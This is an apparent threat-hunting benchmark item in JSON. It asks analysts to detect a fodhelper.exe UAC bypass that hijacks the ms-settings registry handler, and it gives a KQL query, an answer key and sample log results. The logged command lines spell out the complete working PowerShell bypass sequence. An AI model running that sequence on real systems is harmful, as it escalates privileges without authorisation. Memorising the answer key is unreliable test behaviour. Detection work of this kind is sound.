@@ -1,0 +1,47 @@
+{
+    "technique_id": "T1548.002",
+    "question_id": "3f627297-6c38-4e7d-a278-fc2563eaaeaa",
+    "context": "Windows 10 environment",
+    "objective": "Detect a UAC bypass technique where fodhelper.exe is used to escalate privileges by hijacking the ms-settings URI handler in the registry",
+    "technical_details": {
+        "command_analysis": "An attacker creates or overwrites keys under HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command, setting the default value to the path of an executable and adding a DelegateExecute entry, then launches fodhelper.exe to trigger the elevated process.",
+        "detection_approach": "Query DeviceRegistryEvents for RegistryKey matching the ms-settings handler path and inspect RegistryValueData for the binary path written to the (default) value."
+    },
+    "thinking_how_to_phrase_question_and_answer": "We need to prompt the analyst to locate the registry modification event and extract the value data, which corresponds to the binary path used in the UAC bypass.",
+    "prompt": "A Windows 10 system shows registry modifications under HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command, followed by a launch of fodhelper.exe. Determine which executable path was written into the registry to be launched by this UAC bypass.",
+    "answer": [
+        "C:\\Windows\\System32\\cmd.exe"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceRegistryEvents\n| where RegistryKey has \"ms-settings\\\\shell\\\\open\\\\command\"\n| where isempty(RegistryValueName) or RegistryValueName == \"(Default)\"\n| where tolower(RegistryValueData) endswith \".exe\"\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, RegistryKey, RegistryValueData, ActionType\n| sort by TimeGenerated desc",
+    "KQL_validation_message": "KQL query validation successful: The KQL results show two log entries where the registry key associated with 'ms-settings\\shell\\open\\command' has the '(default)' value set to 'C:\\Windows\\System32\\cmd.exe'. This directly matches the expected answer. The presence of 'RegistryValueSet' as the ActionType further indicates that this operation was observed, satisfying the detection requirement.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "InitiatingProcessCommandLine",
+            "RegistryKey",
+            "RegistryValueData",
+            "ActionType"
+        ],
+        [
+            "2025-05-07 16:36:53.131165+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {New-Item \\\"\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\"\" -Force\nNew-ItemProperty \\\"\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\"\" -Name \\\"\"DelegateExecute\\\"\" -Value \\\"\"\\\"\" -Force\nSet-ItemProperty \\\"\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\"\" -Name \\\"\"(default)\\\"\" -Value \\\"\"C:\\Windows\\System32\\cmd.exe\\\"\" -Force\nStart-Process \\\"\"C:\\Windows\\System32\\fodhelper.exe\\\"\"}",
+            "HKEY_CURRENT_USER\\S-1-5-21-4034913605-1276698442-3985778739-500_Classes\\ms-settings\\shell\\open\\command",
+            "C:\\Windows\\System32\\cmd.exe",
+            "RegistryValueSet"
+        ],
+        [
+            "2025-05-07 16:26:10.022317+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {New-Item \\\"\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\"\" -Force\nNew-ItemProperty \\\"\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\"\" -Name \\\"\"DelegateExecute\\\"\" -Value \\\"\"\\\"\" -Force\nSet-ItemProperty \\\"\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\"\" -Name \\\"\"(default)\\\"\" -Value \\\"\"C:\\Windows\\System32\\cmd.exe\\\"\" -Force\nStart-Process \\\"\"C:\\Windows\\System32\\fodhelper.exe\\\"\"}",
+            "HKEY_CURRENT_USER\\S-1-5-21-4034913605-1276698442-3985778739-500_Classes\\ms-settings\\shell\\open\\command",
+            "C:\\Windows\\System32\\cmd.exe",
+            "RegistryValueSet"
+        ]
+    ]
+}
